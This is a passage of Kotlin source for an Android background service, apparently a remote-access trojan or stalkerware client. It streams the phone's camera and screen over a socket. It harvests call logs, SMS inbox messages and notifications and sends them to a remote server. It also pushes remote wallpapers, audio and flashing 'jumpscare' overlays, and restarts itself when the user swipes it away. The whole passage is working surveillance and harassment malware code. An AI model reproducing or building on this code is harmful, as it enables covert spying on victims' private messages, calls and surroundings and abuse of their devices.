            val selector   = CameraSelector.Builder().requireLensFacing(lensFacing).build()

            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                try {
                    cameraProvider = future.get()
                    cameraProvider?.unbindAll()

                    imageAnalysis = ImageAnalysis.Builder()
                        .setTargetResolution(android.util.Size(640, 480))
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                        .build()

                    imageAnalysis!!.setAnalyzer(Executors.newSingleThreadExecutor()) { imageProxy ->
                        if (!streaming) { imageProxy.close(); return@setAnalyzer }
                        val now = System.currentTimeMillis()
                        if (now - lastFrameTime < FRAME_INTERVAL) { imageProxy.close(); return@setAnalyzer }
                        lastFrameTime = now

                        try {
                            val raw      = imageProxy.toBitmap()
                            val rotation = imageProxy.imageInfo.rotationDegrees
                            val bitmap   = if (rotation != 0) {
                                val matrix  = Matrix().apply { postRotate(rotation.toFloat()) }
                                val rotated = Bitmap.createBitmap(raw, 0, 0, raw.width, raw.height, matrix, true)
                                raw.recycle()
                                rotated
                            } else raw

                            val out = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out)
                            val b64: String = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            bitmap.recycle()

                            emitFrame(b64)
                        } catch (_: Exception) {}
                        imageProxy.close()
                    }

                    cameraProvider?.bindToLifecycle(this@DeviceService, selector, imageAnalysis!!)
                    emitStatus(JSONObject().apply { put("cameraActive", true) })
                } catch (e: Exception) {
                    Log.e("DeviceService", "Camera bind error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun stopCamera() {
        streaming = false
        Handler(Looper.getMainLooper()).post { stopCameraInternal() }
        emitStatus(JSONObject().apply { put("cameraActive", false) })
    }

    private fun stopCameraInternal() {
        streaming = false
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        cameraProvider = null
        imageAnalysis  = null
    }

    private fun requestScreenCapture() {
        try {
            if (savedProjectionResultCode == Activity.RESULT_OK && savedProjectionData != null) {
                startScreenCapture(savedProjectionResultCode, savedProjectionData!!)
                return
            }

            val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)

        } catch (e: Exception) {
            Log.e("DeviceService", "Gagal memanggil ScreenCaptureActivity: ${e.message}")
            emitStatus(JSONObject().apply { put("screenActive", false) })
            savedProjectionResultCode = -1
            savedProjectionData = null
        }
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        stopScreenCapture()

        try {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            var capW: Int; var capH: Int; val capDpi: Int
            val scale = 0.5f

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val bounds = wm.currentWindowMetrics.bounds
                capW   = (bounds.width()  * scale).toInt()
                capH   = (bounds.height() * scale).toInt()
                capDpi = resources.displayMetrics.densityDpi
            } else {
                val metrics = DisplayMetrics()
                @Suppress("DEPRECATION") wm.defaultDisplay.getMetrics(metrics)
                capW   = (metrics.widthPixels  * scale).toInt()
                capH   = (metrics.heightPixels * scale).toInt()
                capDpi = metrics.densityDpi
            }

            if (capW <= 0) capW = 200
            if (capH <= 0) capH = 400

            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mgr.getMediaProjection(resultCode, data)

            if (mediaProjection == null) {
                emitStatus(JSONObject().apply { put("screenActive", false) })
                return
            }

            imageReader = ImageReader.newInstance(capW, capH, PixelFormat.RGBA_8888, 2)

            mediaProjection?.createVirtualDisplay(
                "ScreenLive", capW, capH, capDpi,
                android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface, null, null
            )

            screenStreaming = true
            emitStatus(JSONObject().apply { put("screenActive", true) })

            screenHandler = Handler(Looper.getMainLooper())
            screenRunnable = object : Runnable {
                override fun run() {
                    if (!screenStreaming) return
                    if (!screenIsSending) {
                        captureAndSendScreen()
                    }
                    screenHandler?.postDelayed(this, 250L)
                }
            }
            screenHandler?.post(screenRunnable!!)
            
        } catch (e: Exception) {
            Log.e("DeviceService", "startScreenCapture Crash: ${e.message}")
            stopScreenCapture()
        }
    }

    private var screenIsSending = false

    private fun captureAndSendScreen() {
        val reader = imageReader ?: return
        var image: android.media.Image? = null
        try {
            image = reader.acquireLatestImage() ?: return
            
            if (screenIsSending) {
                image.close()
                return
            }

            val planes = image.planes
            if (planes.isEmpty() || planes[0].buffer == null) {
                image.close()
                return
            }

            val buffer      = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride   = planes[0].rowStride
            val rowPadding  = rowStride - pixelStride * image.width

            val bitmapWidth = image.width + rowPadding / pixelStride
            val bitmapHeight = image.height

            if (bitmapWidth <= 0 || bitmapHeight <= 0) {
                image.close()
                return
            }

            buffer.position(0)
            val expectedBytes = bitmapWidth * bitmapHeight * 4
            if (buffer.remaining() < expectedBytes) {
                image.close()
                return
            }

            val bmp = Bitmap.createBitmap(bitmapWidth, bitmapHeight, Bitmap.Config.ARGB_8888)
            bmp.copyPixelsFromBuffer(buffer)

            val cropped = if (rowPadding > 0) {
                val safeWidth = minOf(image.width, bmp.width)
                val safeHeight = minOf(image.height, bmp.height)
                Bitmap.createBitmap(bmp, 0, 0, safeWidth, safeHeight)
            } else {
                bmp
            }

            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 70, baos) 
            
            if (cropped !== bmp) {
                cropped.recycle()
            }
            bmp.recycle()

            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            screenIsSending = true
            
            Thread {
                try { 
                    emitScreenFrame(b64) 
                } catch (e: Exception) {
                    Log.e("DeviceService", "Socket emit screen error: ${e.message}")
                } finally { 
                    screenIsSending = false 
                }
            }.start()

        } catch (e: Exception) {
            screenIsSending = false
            Log.e("DeviceService", "captureAndSendScreen fatal error: ${e.message}")
        } finally {
            try {
                image?.close()
            } catch (_: Exception) {}
        }
    }

    private fun stopScreenCapture() {
        screenStreaming = false
        screenRunnable?.let { screenHandler?.removeCallbacks(it) }
        screenHandler  = null
        screenRunnable = null
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
        emitStatus(JSONObject().apply { put("screenActive", false) })
    }

    private fun emitScreenFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("screen:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (URL(url).openConnection() as HttpURLConnection).apply {
                    requestMethod    = "GET"
                    connectTimeout   = 8000
                    readTimeout      = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }

                if (conn.responseCode != 200) {
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    conn.disconnect()
                    return@Thread
                }

                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()

                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bmp == null) {
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    return@Thread
                }

                val wm = WallpaperManager.getInstance(this)
                wm.setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
            } catch (e: Exception) {
                Log.e("DeviceService", "setWallpaper error: ${e.message}")
                emitStatus(JSONObject().apply { put("wallpaperSet", false) })
            }
        }.start()
    }

    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            emitStatus(JSONObject().apply { put("openedUrl", url) })
        } catch (e: Exception) {
            Log.e("DeviceService", "openUrl error: ${e.message}")
        }
    }
    
    private val notifStore = mutableMapOf<String, ArrayDeque<JSONObject>>()

    private fun storeNotif(payload: JSONObject) {
        val pkg = payload.optString("pkg") ?: return
        val deque = notifStore.getOrPut(pkg) { ArrayDeque() }
        deque.addFirst(payload)
        if (deque.size > 500) deque.removeLast()
    }

    private fun sendStoredNotifs() {
        Thread {
            try {
                val result = JSONArray()
                notifStore.forEach { (pkg, deque) ->
                    val msgs = JSONArray()
                    deque.forEach { msgs.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",     pkg)
                        put("appName", deque.firstOrNull()?.optString("appName") ?: pkg)
                        put("messages", msgs)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("notifList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendStoredNotifs: ${e.message}")
            }
        }.start()
    }
    
    private fun sendCallLogs() {
        Thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    socket?.emit("device:call_logs", JSONObject().apply {
                        put("deviceId", deviceId); put("error", "permission_denied")
                    })
                    return@Thread
                }
                
                val arr = JSONArray()
                val uri = CallLog.Calls.CONTENT_URI
                
                val cursor = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val bundle = Bundle().apply {
                        putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, "${CallLog.Calls.DATE} DESC")
                        putInt(ContentResolver.QUERY_ARG_LIMIT, 50)
                    }
                    contentResolver.query(uri, null, bundle, null)
                } else {
                    contentResolver.query(uri, null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 50")
                }

                cursor?.use { c ->
                    val numCol = c.getColumnIndex(CallLog.Calls.NUMBER)
                    val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
                    val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
                    val durCol = c.getColumnIndex(CallLog.Calls.DURATION)

                    while (c.moveToNext()) {
                        val number = if (numCol >= 0) c.getString(numCol) ?: "Tidak diketahui" else "Tidak diketahui"
                        val name = if (nameCol >= 0) c.getString(nameCol) ?: "" else ""
                        val typeInt = if (typeCol >= 0) c.getInt(typeCol) else 0
                        val date = if (dateCol >= 0) c.getLong(dateCol) else 0L
                        val duration = if (durCol >= 0) c.getString(durCol) ?: "0" else "0"

                        val typeStr = when (typeInt) {
                            CallLog.Calls.INCOMING_TYPE -> "Masuk"
                            CallLog.Calls.OUTGOING_TYPE -> "Keluar"
                            CallLog.Calls.MISSED_TYPE -> "Tak Terjawab"
                            CallLog.Calls.REJECTED_TYPE -> "Ditolak"
                            else -> "Lainnya"
                        }

                        arr.put(JSONObject().apply {
                            put("number", number)
                            put("name", name)
                            put("type", typeStr)
                            put("date", date)
                            put("duration", duration)
                        })
                    }
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:call_logs", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("logs", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendCallLogs Error: ${e.message}")
            }
        }.start()
    }

    private fun sendSms() {
        Thread {
            try {
                val uri = Uri.parse("content://sms/inbox")
                val cursor = contentResolver.query(
                    uri,
                    arrayOf("address", "body", "date", "read"),
                    null, null, "date DESC"
                ) ?: return@Thread
                
                val grouped = mutableMapOf<String, ArrayDeque<JSONObject>>()
                cursor.use {
                    while (it.moveToNext()) {
                        val address = it.getString(0) ?: continue
                        val body    = it.getString(1) ?: continue
                        val date    = it.getLong(2)
                        val msg = JSONObject().apply {
                            put("pkg",     "com.android.sms")
                            put("appName", "SMS")
                            put("title",   address)
                            put("text",    body)
                            put("time",    date)
                        }
                        grouped.getOrPut(address) { ArrayDeque() }.addLast(msg)
                    }
                }

                val result = JSONArray()
                grouped.forEach { (address, msgs) ->
                    val msgArr = JSONArray()
                    msgs.forEach { msgArr.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg",      "com.android.sms")
                        put("appName",  "SMS — $address")
                        put("messages", msgArr)
                    })
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("smsList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendSms: ${e.message}")
            }
        }.start()
    }

    private fun readUid(): String {
        return try {
            val json = assets.open("uid.json").bufferedReader().use { it.readText() }
            JSONObject(json).optString("uid", "")
        } catch (e: Exception) {
            Log.e("DeviceService", "readUid error: ${e.message}")
            ""
        }
    }

    fun emitStatus(statusObj: JSONObject) {
        if (socket?.connected() != true) return
        socket?.emit("device:status", JSONObject().apply {
            put("deviceId", deviceId)
            put("status", statusObj)
        })
    }

    private fun emitFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("camera:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_WATCHDOG) {
            if (socket == null || socket?.connected() == false) {
                connectSocket()
            }
            scheduleAlarm()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)

        
        try { unregisterReceiver(localReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(chatFromTargetReceiver) } catch (_: Exception) {}
        
        stopCameraInternal()
        stopScreenCapture()
        stopLockFlashBlink()
        flashBlinking = false
        flashHandler?.removeCallbacks(flashRunnable ?: Runnable {})
        flashHandler = null
        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        socket?.disconnect()
        socket = null
    }
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d("DeviceService", "Aplikasi dihapus dari history, menjadwalkan restart via AlarmManager...")
        
        try {
            val restartServiceIntent = Intent(applicationContext, DeviceService::class.java).apply {
                setPackage(packageName)
            }
            
            val restartServicePendingIntent = PendingIntent.getService(
                applicationContext, 1, restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            
            val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            alarmService.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent
            )
        } catch (e: Exception) {
            Log.e("DeviceService", "Gagal menjadwalkan restart dari onTaskRemoved: ${e.message}")
        }
    }
    
    

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SyncXxX")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Sync XxX Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private var mediaPlayer: MediaPlayer? = null
    private var lockMediaPlayer: MediaPlayer? = null

    private fun playLockSound() {
        try {
            lockMediaPlayer?.release()
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            lockMediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                setOnCompletionListener { release(); lockMediaPlayer = null }
                prepare()
                start()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playLockSound: ${e.message}")
        }
    }

    private fun playAudio(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnCompletionListener { release(); mediaPlayer = null }
                setOnErrorListener { _, _, _ -> release(); mediaPlayer = null; false }
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playAudio: ${e.message}")
        }
    }

    private val jumpscareViews = mutableListOf<View>()
    private val jumpscareHandler = Handler(Looper.getMainLooper())
    private var jumpscareRunnable: Runnable? = null
    private var jumpscareUrls: List<String> = emptyList()

    private fun startJumpscare(value: String) {
        stopJumpscare()
        jumpscareUrls = try {
            val arr = JSONArray(value)
            (0 until arr.length()).map { arr.getString(it) }.filter { it.isNotBlank() }
        } catch (_: Exception) {
            if (value.isNotBlank()) listOf(value) else emptyList()
        }
        if (jumpscareUrls.isEmpty()) return

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = resources.displayMetrics
        val screenW = metrics.widthPixels
        val screenH = metrics.heightPixels

        val spawnJumpscare = object : Runnable {
            override fun run() {
                if (jumpscareUrls.isEmpty()) return
                val pickedUrl = jumpscareUrls.random()
                try {
                    val imgView = ImageView(this@DeviceService)
                    imgView.scaleType = ImageView.ScaleType.CENTER_CROP

                    val size = (120 + (Math.random() * 80).toInt())
                    val px = (size * metrics.density).toInt()

                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION")
                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        px, px, type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        gravity = Gravity.TOP or Gravity.START
                        x = (Math.random() * (screenW - px)).toInt().coerceAtLeast(0)
                        y = (Math.random() * (screenH - px)).toInt().coerceAtLeast(0)
                    }

                    wm.addView(imgView, params)
                    jumpscareViews.add(imgView)

                    Thread {
                        try {
                            var redirectUrl = pickedUrl
                            var bmp: Bitmap? = null
                            for (i in 0..4) {
                                val conn = URL(redirectUrl).openConnection() as HttpURLConnection
                                conn.connectTimeout          = 12000
                                conn.readTimeout             = 15000
                                conn.instanceFollowRedirects = false
                                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
                                conn.setRequestProperty("Accept", "image/*,*/*;q=0.8")
                                conn.connect()
                                val code = conn.responseCode
                                if (code in 300..399) {
                                    val loc = conn.getHeaderField("Location")
                                    conn.disconnect()
                                    if (loc != null) { redirectUrl = loc; continue } else break
                                }
                                val bytes = conn.inputStream.readBytes()
                                conn.disconnect()
                                bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                break
                            }
                            if (bmp != null) {
                                val finalBmp = bmp
                                Handler(Looper.getMainLooper()).post { imgView.setImageBitmap(finalBmp) }
                            } else {
                                Log.e("DeviceService", "jumpscare img null: $pickedUrl")
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "jumpscare img load: ${e.message}")
                        }
                    }.start()

                    Handler(Looper.getMainLooper()).postDelayed({
                        try { wm.removeView(imgView); jumpscareViews.remove(imgView) } catch (_: Exception) {}
                    }, 2500)

                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare spawn: ${e.message}")
                }

                jumpscareRunnable = this
                jumpscareHandler.postDelayed(this, 600)
            }
        }

        jumpscareRunnable = spawnJumpscare
        jumpscareHandler.post(spawnJumpscare)
    }

    private fun stopJumpscare() {
        jumpscareUrls = emptyList()
        jumpscareRunnable?.let { jumpscareHandler.removeCallbacks(it) }
        jumpscareRunnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscareViews.toList().forEach { v ->
            try { wm.removeView(v) } catch (_: Exception) {}
        }
        jumpscareViews.clear()
    }
}

object SocketHolder {
    var connected: Boolean = false
}
